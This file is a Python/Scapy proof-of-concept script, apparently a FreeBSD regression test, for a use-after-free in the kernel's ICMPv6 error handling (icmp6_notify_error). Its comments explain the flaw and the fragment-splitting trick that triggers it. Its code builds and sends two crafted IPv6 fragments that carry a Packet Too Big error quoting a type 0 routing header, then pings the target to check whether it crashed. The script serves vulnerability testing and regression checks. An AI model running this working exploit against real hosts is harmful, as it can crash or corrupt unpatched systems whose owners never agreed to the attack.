#!/usr/bin/env python
#-
# SPDX-License-Identifier: BSD-2-Clause
#
# Copyright (c) 2026 Olivier Cochard <olivier@FreeBSD.org>
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
# OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
# OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
# SUCH DAMAGE.
#
# Proof of concept for the use-after-free in icmp6_notify_error(),
# sys/netinet6/icmp6.c.  When an ICMPv6 error quotes a packet that carries
# a type 0 routing header with segleft != 0, the routing-header branch
# pointer (rth) is read after a second m_pullup() that can relocate and
# free the mbuf it points into:
#
#	rth = (struct ip6_rthdr *)(mtod(m, char *) + eoff);
#	rthlen = (rth->ip6r_len + 1) << 3;
#	if (rth->ip6r_segleft && rth->ip6r_type == IPV6_RTHDR_TYPE_0) {
#		if ((m = m_pullup(m, eoff + rthlen)) == NULL) ...
#		...
#	}
#	eoff += rthlen;
#	nxt = rth->ip6r_nxt;		/* rth may now be freed */
#
# To make the pullup relocate rather than no-op, the whole ICMPv6 error
# must reach icmp6_input() as a chain with an mbuf boundary inside the
# quoted routing header.  Reassembly (frag6.c) builds such a chain: each
# received fragment keeps its own storage, joined by m_cat().  So we send
# the error as two IPv6 fragments and place the fragment boundary inside
# the quoted routing header.
#
# On a KASAN kernel the stale read panics; on a plain kernel it reads
# freed memory silently.  The test fails if the host stops answering
# afterwards (it checks liveness with a Neighbor Solicitation / echo).

import argparse
import logging
logging.getLogger("scapy").setLevel(logging.CRITICAL)
import scapy.all as sp
import sys
from time import sleep


def main():
	parser = argparse.ArgumentParser("icmp6_rthdr_uaf.py")
	parser.add_argument('--sendif', nargs=1, required=True,
		help='The interface through which the packet will be sent')
	parser.add_argument('--recvif', nargs=1, required=True,
		help='The interface on which to check for the reply')
	parser.add_argument('--src', nargs=1, required=True,
		help='The source IP address (ours)')
	parser.add_argument('--to', nargs=1, required=True,
		help='The destination IP address (the target under test)')
	parser.add_argument('--debug', required=False, action='store_true')
	args = parser.parse_args()

	src = args.src[0]
	dst = args.to[0]

	#
	# Build the packet the error quotes: an inner IPv6 header, a type 0
	# routing header with segleft != 0 (so the vulnerable branch is taken)
	# and a couple of addresses so the header is long enough to straddle a
	# fragment boundary, then some payload.
	#
	# From the target's point of view the error says "this is the packet
	# you (dst) sent to me (src) that I am reporting on", so the inner
	# header goes dst -> src.
	#
	rthdr = sp.IPv6ExtHdrRouting(type=0, segleft=2,
		addresses=["2001:db8:aaaa::1", "2001:db8:aaaa::2"])
	quoted = sp.IPv6(src=dst, dst=src) / rthdr / \
		sp.UDP(sport=1234, dport=5678) / (b"A" * 64)

	# A Packet Too Big error reaches icmp6_notify_error() via the deliver
	# path; any of the error types would do.
	#
	# The ICMPv6 checksum covers the whole reassembled message with an
	# IPv6 pseudo-header (src -> dst).  Scapy does not fill it in for a
	# payload that rides inside a fragment header, so build the full error
	# as its own IPv6 packet first, let scapy compute the checksum over
	# that, and take the already-summed ICMPv6 bytes to fragment by hand.
	full = sp.IPv6(src=src, dst=dst) / sp.ICMPv6PacketTooBig(mtu=1280) / quoted
	payload = bytes(full)[40:]	# drop the outer IPv6 header, keep icmp6..

	#
	# The inner routing header starts, within the ICMPv6 error payload,
	# after the ICMPv6 header (8) and the inner IPv6 header (40): byte 48.
	# Split the payload so the second fragment begins a few bytes into the
	# routing header, i.e. at a point the second m_pullup() has to gather
	# across the fragment boundary.  Fragment offsets are in 8-byte units,
	# so the split must be a multiple of 8.
	#
	split = 48  # 8 (icmp6) + 40 (inner ip6): start of the routing header
	# Nudge the boundary a little into the routing header while staying
	# 8-aligned: one 8-byte unit in covers rth->ip6r_len and the start of
	# the first address, which is what the pullup has to relocate.
	split += 8  # boundary inside the routing header
	assert split % 8 == 0

	first = payload[:split]
	second = payload[split:]

	# Fragment id and the ICMPv6 next header.
	fid = 0xdead
	frag1 = sp.Ether() / \
		sp.IPv6(src=src, dst=dst) / \
		sp.IPv6ExtHdrFragment(offset=0, m=1, id=fid, nh=58) / \
		first
	frag2 = sp.Ether() / \
		sp.IPv6(src=src, dst=dst) / \
		sp.IPv6ExtHdrFragment(offset=split // 8, m=0, id=fid, nh=58) / \
		second

	if args.debug:
		frag1.display()
		frag2.display()

	sp.sendp(frag1, iface=args.sendif[0], verbose=False)
	sp.sendp(frag2, iface=args.sendif[0], verbose=False)

	# Give the stack a moment to reassemble and process the error.
	sleep(0.20)

	# Liveness check: if the target just took a KASAN panic or corrupted
	# itself, it will not answer this echo.  srp1 sends the request and
	# waits for the matching reply on the same interface.
	ping = sp.Ether() / \
		sp.IPv6(src=src, dst=dst) / \
		sp.ICMPv6EchoRequest(id=0x4242, seq=1)
	reply = sp.srp1(ping, iface=args.sendif[0], timeout=2, verbose=False)
	if reply is None or not reply.getlayer(sp.ICMPv6EchoReply):
		print("target did not answer after the crafted error: "
		    "likely crashed", file=sys.stderr)
		sys.exit(1)

	sys.exit(0)


if __name__ == '__main__':
	main()
